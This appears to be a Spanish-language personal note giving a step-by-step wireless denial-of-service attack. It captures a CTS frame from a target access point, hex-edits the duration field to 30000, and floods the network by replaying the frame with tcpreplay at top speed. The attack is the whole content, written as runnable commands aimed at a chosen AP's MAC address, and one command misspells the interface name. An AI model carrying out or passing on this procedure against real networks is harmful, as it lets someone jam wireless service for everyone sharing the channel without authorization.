# Ataques CTS Frame

Tags: #CTS-Frame #Attack #WPA/WPA2 

## Secuestro del ancho de banda 

```bash 
# Conceptos 
1. Para este tipo de ataque debemos de enviar un RTS (Request To Send)
2. Debemos captura el CTS (Clear To Send) y lo aprovechamos para hacer el ataque de DoS, estas tramas CTS se utilizan para asignar un canal por una duración determinada 
3. En la trama CTF 
	1. Frame control = 
	2. Duration (micro/seg) = Tiene valores desde el 0 hasta 32767, es aqui donde debemos poner un valor de 30000
	3. Receiver address = Ponemos la dirección MAC del AP del cual queremos explotar
	4. FCS = Lo podemos obtener de 'Wireshark' y es calculado por hardware
```

```bash 
1. Para iniciar el ataque debemos de capturar el trafico del AP con 'Wireshark' en la interfaz 'wlan0mon' y lo filtramos "wlan.fc.type_subtype==28"

2. Debemos de exportar un paquete con las siguientes opciones:
	1. Exportar como: 'Wireshark/tcpdump/...pcap'
	2. Click: Solo paquetes seleccionados 
	3. Nombre: CtsFrame
```

```bash 
3. Usamos la siguiente tool para poder abrir la captura en hexadecimal y poder manipular la trama CTS
❯ sudo apt install ghex -y                   # Instalar la tool 

❯ ghex <CtsFrame.pcap> > /dev/null 2>&1 &    # Se nos abrira la herramienta y en ella podremos ver la trama CTS de la captura, donde la trama es la ultima parte iniciando de derecha a izquierda. Los primeros 4 son del FCS, los siguientes 6 son la MAC, y los siguientes 2 es la duración, es ahí en donde se debe de modificar el valor  

4. Debemos de colocar 30000 en Hexadecimal que es: 7530, pero en la 'frame' se coloca al reves 3075
❯ ghex <CtsFrame.pcap> > /dev/null 2>&1 &    # Abrimos de nuevo la trama y colocamos el numero 3075 en la parte de duracion 
```

```bash 
5. Ahora lanzamos el ataque para congestionar la red una vez obtenida la captura modificada 

❯ tcpreplay --intf1=waln0mon --topspeed --loop=2000 <CtsFrame.pcap> 2>/dev/null
	# loop = Paquetes a emitir 
	# intf1 = Interfaz a usar 
	# topspeed = Velocidad para que no nos ponga en cola los paquetes y tengamos que esperar 
	# Al final colocamos la traza a replicar 
```